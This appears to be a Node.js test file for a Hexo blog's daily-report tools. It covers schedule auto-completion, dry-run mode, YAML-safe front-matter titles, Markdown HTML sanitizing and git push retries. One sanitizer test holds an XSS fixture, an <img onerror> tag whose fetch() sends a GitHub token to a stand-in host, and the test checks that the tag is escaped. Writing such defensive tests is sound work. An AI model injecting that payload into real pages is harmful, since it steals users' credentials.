/* 日程自动完成 + 共用 git 工具的测试。
 *
 * 重点验的是「不该发生的事没发生」：
 *   - 未来的安排不会被今天的信号提前勾掉（勾了就撤不回来）
 *   - 演练模式一个字节都不写盘
 *   - 标题里带 YAML 特殊字符不会让文章被 Hexo 静默丢掉
 *   - 检索结果里的 HTML 标签进不了正文，但代码块要原样保留
 */
import { mkdtempSync, mkdirSync, writeFileSync, readFileSync, rmSync } from 'node:fs'
import { execFileSync } from 'node:child_process'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import assert from 'node:assert/strict'

const REPO = process.cwd()
let pass = 0
const check = (name, fn) => {
  try { fn(); console.log('  ✓ ' + name); pass++ }
  catch (e) { console.log('  ✗ ' + name + '\n      ' + (e.message || e)); process.exitCode = 1 }
}
const acheck = async (name, fn) => {
  try { await fn(); console.log('  ✓ ' + name); pass++ }
  catch (e) { console.log('  ✗ ' + name + '\n      ' + (e.message || e)); process.exitCode = 1 }
}

const bjKey = (d = new Date()) => new Intl.DateTimeFormat('sv-SE', {
  timeZone: 'Asia/Shanghai', year: 'numeric', month: '2-digit', day: '2-digit'
}).format(d)
const TODAY = bjKey()
const YESTERDAY = bjKey(new Date(Date.now() - 86400000))
const TOMORROW = bjKey(new Date(Date.now() + 86400000))
const NEXT_WEEK = bjKey(new Date(Date.now() + 7 * 86400000))

// ---------- 沙盒：一个临时的迷你仓库 ----------
const box = mkdtempSync(join(tmpdir(), 'sched-'))
mkdirSync(join(box, 'source/_data'), { recursive: true })
mkdirSync(join(box, 'source/_posts'), { recursive: true })
writeFileSync(join(box, 'source/_posts/rasterization-antialiasing.md'),
  '---\ntitle: 光栅化与抗锯齿：从三角形到 MSAA\ndate: 2026-08-01 10:00:00\n---\n\n正文。\n')
const git = (...a) => execFileSync('git', a, { cwd: box, encoding: 'utf8', stdio: 'pipe' })
git('init', '-q')
git('config', 'user.email', 't@t.t'); git('config', 'user.name', 't')
git('add', '-A'); git('commit', '-q', '-m', 'init')

const writeSchedule = days => writeFileSync(
  join(box, 'source/_data/schedule.json'),
  JSON.stringify({ updatedAt: '2026-01-01T00:00:00Z', days }, null, 2) + '\n')
const readSchedule = () => JSON.parse(readFileSync(join(box, 'source/_data/schedule.json'), 'utf8'))

const { autoComplete } = await import('file://' + join(REPO, 'tools/daily-report/schedule-auto.mjs'))

const T = (id, text, when) => ({ id, text, done: false, when })
const run = opts => {
  process.chdir(box)
  return autoComplete({ ownerLogin: 'Noimpty-zby', windowStart: Date.now() - 24 * 3600 * 1000, ...opts })
    .finally(() => process.chdir(REPO))
}

console.log('\n日程自动完成')

await acheck('今天的任务，条件满足 → 勾上', async () => {
  writeSchedule({ [TODAY]: [T('a', '写作业二复盘', { type: 'post', match: '作业二' })] })
  const r = await run({ newPosts: [{ title: 'UE5 作业二复盘', file: 'source/_posts/hw2.md' }] })
  assert.equal(r.changed, 1)
  assert.equal(readSchedule().days[TODAY][0].done, true)
})

await acheck('昨天的任务也在窗口内（22 点跑，昨晚做的算数）', async () => {
  writeSchedule({ [YESTERDAY]: [T('a', '写作业二复盘', { type: 'post', match: '作业二' })] })
  const r = await run({ newPosts: [{ title: 'UE5 作业二复盘', file: 'source/_posts/hw2.md' }] })
  assert.equal(r.changed, 1)
})

await acheck('★ 未来的安排不会被提前勾掉', async () => {
  writeSchedule({
    [TODAY]: [T('a', '写作业二复盘', { type: 'post', match: '作业二' })],
    [TOMORROW]: [T('b', '写作业二复盘', { type: 'post', match: '作业二' })],
    [NEXT_WEEK]: [T('c', '写作业二复盘', { type: 'post', match: '作业二' })]
  })
  const r = await run({ newPosts: [{ title: 'UE5 作业二复盘', file: 'source/_posts/hw2.md' }] })
  assert.equal(r.changed, 1, '只该勾今天那一条')
  const d = readSchedule().days
  assert.equal(d[TODAY][0].done, true)
  assert.equal(d[TOMORROW][0].done, false, '明天的被提前勾了')
  assert.equal(d[NEXT_WEEK][0].done, false, '下周的被提前勾了')
})

await acheck('太久以前的安排也不再回头勾', async () => {
  const old = bjKey(new Date(Date.now() - 10 * 86400000))
  writeSchedule({ [old]: [T('a', '写作业二复盘', { type: 'post', match: '作业二' })] })
  const r = await run({ newPosts: [{ title: 'UE5 作业二复盘', file: 'source/_posts/hw2.md' }] })
  assert.equal(r.changed, 0)
})

await acheck('★ 演练模式：报告会勾什么，但文件一个字节都不动', async () => {
  writeSchedule({ [TODAY]: [T('a', '写作业二复盘', { type: 'post', match: '作业二' })] })
  const before = readFileSync(join(box, 'source/_data/schedule.json'), 'utf8')
  const r = await run({ newPosts: [{ title: 'UE5 作业二复盘', file: 'source/_posts/hw2.md' }], dry: true })
  assert.equal(r.changed, 1)
  assert.equal(r.dry, true)
  assert.equal(readFileSync(join(box, 'source/_data/schedule.json'), 'utf8'), before, '演练把文件改了')
})

await acheck('没挂条件的任务一律不碰', async () => {
  writeSchedule({ [TODAY]: [{ id: 'a', text: '复习光栅化', done: false }] })
  const r = await run({ newPosts: [{ title: '光栅化复习笔记', file: 'source/_posts/x.md' }] })
  assert.equal(r.changed, 0)
})

await acheck('关键词是空的 → 不匹配任何东西（不是匹配一切）', async () => {
  writeSchedule({ [TODAY]: [T('a', 'x', { type: 'post', match: '   ' })] })
  const r = await run({ newPosts: [{ title: '随便一篇', file: 'source/_posts/x.md' }] })
  assert.equal(r.changed, 0)
})

await acheck('★ edit 条件能用中文标题匹配（文件名是英文 slug）', async () => {
  // 在沙盒里真改一次那篇文章并提交，让 git log 认得
  writeFileSync(join(box, 'source/_posts/rasterization-antialiasing.md'),
    '---\ntitle: 光栅化与抗锯齿：从三角形到 MSAA\ndate: 2026-08-01 10:00:00\n---\n\n正文改过了。\n')
  process.chdir(box); git('add', '-A'); git('commit', '-q', '-m', '改图'); process.chdir(REPO)

  writeSchedule({ [TODAY]: [T('a', '补几张抗锯齿的图', { type: 'edit', match: '抗锯齿' })] })
  const r = await run({})
  assert.equal(r.changed, 1, '中文关键词没能匹配到中文标题')
  assert.match(r.done[0].why, /光栅化与抗锯齿/)
})

await acheck('★ reply 条件能用中文标题匹配（giscus 标题是 url 路径）', async () => {
  writeSchedule({ [TODAY]: [T('a', '回一下读者提问', { type: 'reply', match: '抗锯齿' })] })
  const r = await run({
    comments: { ok: true, items: [{ who: 'Noimpty-zby', on: '2026/08/01/rasterization-antialiasing/' }] }
  })
  assert.equal(r.changed, 1, '中文关键词没能匹配到文章标题')
  assert.match(r.done[0].why, /光栅化与抗锯齿/)
})

await acheck('reply 留空 = 任意一条回复都算', async () => {
  writeSchedule({ [TODAY]: [T('a', '回评论', { type: 'reply', match: '' })] })
  const r = await run({ comments: { ok: true, items: [{ who: 'Noimpty-zby', on: '2026/08/01/whatever/' }] } })
  assert.equal(r.changed, 1)
})

await acheck('别人的回复不算你回的', async () => {
  writeSchedule({ [TODAY]: [T('a', '回评论', { type: 'reply', match: '' })] })
  const r = await run({ comments: { ok: true, items: [{ who: '路人甲', on: '2026/08/01/whatever/' }] } })
  assert.equal(r.changed, 0)
})

await acheck('已经勾上的不会被重写 autoWhy', async () => {
  writeSchedule({ [TODAY]: [{ ...T('a', 'x', { type: 'post', match: '作业二' }), done: true, autoWhy: '你自己勾的' }] })
  const r = await run({ newPosts: [{ title: 'UE5 作业二复盘', file: 'source/_posts/hw2.md' }] })
  assert.equal(r.changed, 0)
  assert.equal(readSchedule().days[TODAY][0].autoWhy, '你自己勾的')
})

// ---------- git.mjs ----------
const { yamlString, sanitizeMd, stripAngles, pushWithRetry } = await import('file://' + join(REPO, 'tools/nanaly/git.mjs'))
const yaml = await import('file://' + join(REPO, 'node_modules/js-yaml/index.js')).catch(() => null)

console.log('\nfront-matter 标题安全')

const titles = [
  'Nanite: 窝读完之后的三个疑问',
  '[笔记] UE5 的渲染管线',
  '- 随笔：今天很安静',
  '"窝说" 与 "你说"',
  '#1 窝的观察',
  '主人今天写了 3 篇：都在讲光栅化',
  '换行\n混进来了',
  ''
]
titles.forEach(t => {
  check(`标题 ${JSON.stringify(t).slice(0, 28)} 不会让 front-matter 解析失败`, () => {
    const fm = `title: ${yamlString(t)}\ndate: 2026-08-13 20:00:00\n`
    if (!yaml) throw new Error('js-yaml 不在，跳过')
    const obj = yaml.default.load(fm)
    assert.ok(obj && typeof obj.title === 'string', '解析出来不是字符串')
    assert.equal(obj.title, t.replace(/[\r\n\t]+/g, ' ').trim())
  })
})

check('对照组：不加引号的话，带冒号的标题真的会炸', () => {
  if (!yaml) throw new Error('js-yaml 不在')
  assert.throws(() => yaml.default.load('title: Nanite: 三个疑问\ndate: 2026-08-13\n'))
})

console.log('\n正文里的 HTML')

check('★ 裸标签被钝化成实体，不再执行', () => {
  const evil = '- **某新闻** —— <img src=x onerror="fetch(\'//e/?t=\'+window.NANALY.githubToken())"> 转述。[来源](https://a.b)'
  const out = sanitizeMd(evil)
  assert.ok(!/<img/i.test(out), '还留着 <img')
  assert.ok(out.includes('&lt;img'), '没有转成实体')
  assert.ok(out.includes('[来源](https://a.b)'), '正常的链接被弄坏了')
})

check('围栏代码块里的尖括号原样保留', () => {
  const md = '说明：\n\n```cpp\nTArray<FVector> Pts;\n```\n\n结束 <b>粗体</b>'
  const out = sanitizeMd(md)
  assert.ok(out.includes('TArray<FVector>'), '代码块里的泛型被改了')
  // 只需要转掉 `<`，标签就不成立了；`>` 保持原样，肉眼看到的还是一样
  assert.ok(out.includes('&lt;b>'), '代码块外面的标签没处理')
})

check('行内代码里的尖括号原样保留', () => {
  const out = sanitizeMd('用 `TArray<int>` 就行，别写 <script>x</script>')
  assert.ok(out.includes('`TArray<int>`'), '行内代码被改了')
  assert.ok(!/<script/i.test(out), '<script 还在')
})

check('送进提示词的外部标题先去掉尖括号', () => {
  assert.equal(stripAngles('<img src=x onerror=y> 新游戏发布'), ' img src=x onerror=y  新游戏发布')
})

console.log('\n推送重试')

check('第一次就成功 → 不 pull', () => {
  const calls = []
  pushWithRetry((...a) => { calls.push(a.join(' ')); return '' }, '测试')
  assert.deepEqual(calls, ['push'])
})

check('★ 被拒 → rebase 后重试 → 成功', () => {
  const calls = []
  let n = 0
  pushWithRetry((...a) => {
    calls.push(a.join(' '))
    if (a[0] === 'push' && n++ === 0) throw new Error('non-fast-forward')
    return ''
  }, '测试')
  assert.deepEqual(calls, ['push', 'pull --rebase --autostash', 'push'])
})

check('★ 一直失败 → 必须抛出去（让工作流变红），不能默默返回', () => {
  assert.throws(
    () => pushWithRetry((...a) => { if (a[0] === 'push') throw new Error('rejected'); return '' }, '测试'),
    /测试推送失败/
  )
})

check('rebase 本身失败 → 立刻放弃，不空转', () => {
  let pushes = 0
  assert.throws(() => pushWithRetry((...a) => {
    if (a[0] === 'push') { pushes++; throw new Error('rejected') }
    throw new Error('conflict')
  }, '测试'))
  assert.equal(pushes, 1, '真冲突时不该反复重推')
})

rmSync(box, { recursive: true, force: true })
console.log(`\n${pass} 项通过`)
